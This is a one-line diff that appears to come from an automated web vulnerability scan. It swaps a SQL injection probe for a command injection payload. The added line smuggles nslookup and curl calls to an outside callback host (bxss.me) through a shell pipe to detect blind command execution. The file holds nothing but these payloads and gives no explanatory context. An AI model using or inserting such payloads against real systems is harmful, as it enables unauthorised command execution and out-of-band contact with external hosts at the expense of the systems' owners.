@@ -1,1 +1,1 @@
--1' OR 2+32-32-1=0+0+0+1 -- 
+|(nslookup -q=cname hitmlzktnlnnme015f.bxss.me||curl hitmlzktnlnnme015f.bxss.me)
